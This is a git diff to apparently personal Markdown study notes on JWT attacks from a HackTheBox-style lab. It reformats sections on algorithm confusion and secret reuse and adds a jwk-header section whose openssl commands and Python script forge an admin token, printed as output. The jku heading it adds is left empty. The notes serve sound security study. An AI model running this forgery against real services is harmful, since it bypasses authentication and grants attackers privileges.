@@ -5,6 +5,8 @@
     - [Attacking the Signing Secret](#attacking-the-signing-secret)
     - [Algorithm Confusion](#algorithm-confusion)
     - [Reusing JWT Secrets](#reusing-jwt-secrets)
+    - [Exploiting jwk](#exploiting-jwk)
+    - [Exploiting jku](#exploiting-jku)
 
 
 
@@ -104,28 +106,26 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjo
 
 - **Forging a Token**
     1. rsa_sign2n conveniently saves the public key to a file within the docker container:
-    ```bash
-    cat b1969268f0e66b1c_65537_x509.pem
+        ```bash
+        cat b1969268f0e66b1c_65537_x509.pem
 
-    -----BEGIN PUBLIC KEY-----
-    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsZaSaPDmaxyds/NMppno
-    dUEWomQEdu+p57T4B7tjCZp0nRQk1HnOR8LuTztHn6U4ZKEHvHWGF7PxHHgtxrTb
-    7uhbwhsu3XVTcd1c/S2G9TCvW4WaF8uqNjgzUJEANsABGXHSVCuM7CLf2jWjVyWX
-    6w4dbyK3LNHvt/tkJspeGwx3wT1Gq2RpQ6n0+J/q6vxKBAc4z9QuzfgLPpnZFdYj
-    kZyJimyFmiyPDP6k2MZYr6rgiuUhCQQlFBL8yS94dITAoZhGIJDtNW9WDV7gOB8t
-    OgPrAdBM2rm8SmlNjsaHxIDec2E+qafCm8VnwSLXHXb9IDvLSTCqI+gOSJEGgTuT
-    VQIDAQAB
-    -----END PUBLIC KEY-----
-    ```
+        -----BEGIN PUBLIC KEY-----
+        MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsZaSaPDmaxyds/NMppno
+        dUEWomQEdu+p57T4B7tjCZp0nRQk1HnOR8LuTztHn6U4ZKEHvHWGF7PxHHgtxrTb
+        7uhbwhsu3XVTcd1c/S2G9TCvW4WaF8uqNjgzUJEANsABGXHSVCuM7CLf2jWjVyWX
+        6w4dbyK3LNHvt/tkJspeGwx3wT1Gq2RpQ6n0+J/q6vxKBAc4z9QuzfgLPpnZFdYj
+        kZyJimyFmiyPDP6k2MZYr6rgiuUhCQQlFBL8yS94dITAoZhGIJDtNW9WDV7gOB8t
+        OgPrAdBM2rm8SmlNjsaHxIDec2E+qafCm8VnwSLXHXb9IDvLSTCqI+gOSJEGgTuT
+        VQIDAQAB
+        -----END PUBLIC KEY-----
+        ```
     2. We can use CyberChef to forge our JWT by selecting the JWT Sign operation. We must set the Signing algorithm to HS256 and paste the public key into the Private/Secret key field. Additionally, we need to add a newline (\n) at the end of the public key:
     ![jwt-algconfution](/images/jwt_algconfusion.jpg)
 
 
 ## Reusing JWT Secrets
 - Context: JSON Web Tokens (JWTs) are widely used for authentication in web applications.
-
 - Best Practice: Each web application should have a unique JWT signing secret.
-
 - Risk: If multiple applications share the same secret, a token from one app can potentially be used on another (token reuse).
 
 - **🛑 Why It’s a Problem**
@@ -133,19 +133,70 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjo
 
     - Privilege escalation: If the reused token contains elevated privileges, this could bypass role-based access controls in another application.
 
-- **🔍 Example Scenario**
+- **Example Scenario**
     - A company operates two apps:
-
         - socialA.htb (user is a moderator)
-
         - socialB.htb (user is a regular user)
 
     - JWT from socialA.htb contains:
         - {"role": "moderator"}
-
     - JWT from socialB.htb contains:
         - {"role": "user"}
-
     - Issue: If both apps use the same secret, the user can:
-
         - Take the moderator token from socialA and present it to socialB then gain unauthorized moderator access on socialB
+
+## Exploiting jwk
+- The "jwk" (JSON Web Key) Header Parameter is the public key that corresponds to the key used to digitally sign the JWS. 
+- This key is represented as a JSON Web Key. Use of this Header Parameter is OPTIONAL.
+
+- jwk contains information about the public key used for key verification for asymmetric JWTs. If the web application is misconfigured to accept arbitrary keys provided in the jwk claim, we could forge a JWT, sign it with our own private key, and then provide the corresponding public key in the jwk claim for the web application to verify the signature and accept the JWT.
+
+    ![Jwk](/images/jwt_jwk_1.png)
+
+- **Exploitation:**
+    1. Generate our own keys to sign the JWT
+        ```bash
+        openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
+
+        openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
+        ```
+
+        - With these keys, we need to perform the following steps:
+            - Manipulate the JWT's payload to set the isAdmin claim to True
+            - Manipulate the JWT's header to set the jwk claim to our public key's details
+            - Sign the JWT using our private key
+
+    2. Automate the exploitation
+        ```bash
+        pip3 install pyjwt cryptography python-jose
+        ```
+        ```python
+        from cryptography.hazmat.backends import default_backend
+        from cryptography.hazmat.primitives import serialization
+        from jose import jwk
+        import jwt
+
+        # JWT Payload
+        jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}
+
+        # convert PEM to JWK
+        with open('exploit_public.pem', 'rb') as f:
+            public_key_pem = f.read()
+        public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
+        jwk_key = jwk.construct(public_key, algorithm='RS256')
+        jwk_dict = jwk_key.to_dict()
+
+        # forge JWT
+        with open('exploit_private.pem', 'rb') as f:
+            private_key_pem = f.read()
+        token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})
+
+        print(token)
+        ```
+        ```bash
+        python3 exploit.py 
+        eyJhbGciOiJSUzI1NiIsImp3ayI6eyJhbGciOiJSUzI1NiIsImUiOiJBUUFCIiwia3R5IjoiUlNBIiwibiI6InJ0eV96YWRVSjJBZFpfQ3BqaDJCRlVQd2YtWnlWeUt6aWYzbjZZc3ZxVWlwZjh5ZVNpSGk2RFJVRm9ibzVfMnpnSnRQeVVGTmNyRzIwSWd6cTdobzRDNWRfcVN0d2RfVnRfcHQ0Q0Zmdm1CZHRlZzVTcmJIYVVlbU1CQXFYbVB6S2sxOUNOVkZTdVhqa21mSk9OZ1Q3Q3VoRFV5bTFiN3U3TjNsQmlZVmh2Rnl5NVZ1dHplNkN2MS1aMTF0THhCaEF4cnlNTHNsSG1HODZmNld5ZTAwcGYyR21xel93LTdGT3dfcUFZdUwtZlpMVXNZSVltT01PVDAxa3pMV1VWSDJ0R2VYNGdYaVc2YU94cC1SNFd4NUo5ai1QZlFjcVFTOXduOHZ0Ry1rSjBQYlRVbGozUi12djk3d0VLcEZuanhzSGxWN1Rvcm9nSWJKTDZ4YUZJR3YxUSJ9LCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6dHJ1ZX0.FimEK1Cnw1PL8Krt7mpzIcBAkVgTOAVquh7yUFIr3xrQmaDzObxmlkOZmHwmBN1Odc0NOZToWVo_o-0Yf1ldPvueGlCShlUyoOyFMVQhiWcW_EIpCPdRoG60Venyp6ePHirrZGPSXz4JAKUKRdj4CWK_2sIHlQmGmmMy0W1hL-08Dq-oueYWY-OsshDrbyMx6ibZ8vmVL4PkiBv6PalPDIrIrJZHEM0tr0IotZy_MNiOF2Rvy22XU2FapIj0cuCL21vud9k_IQZwVhPdEJ_XEnnLiFYRYI0wBl3SQ9N4xtt0eMPSe4CqtOd4veYT1JCmqL6jKkkumIqdUHcdQhA_Aw
+        ```
+
+
+## Exploiting jku
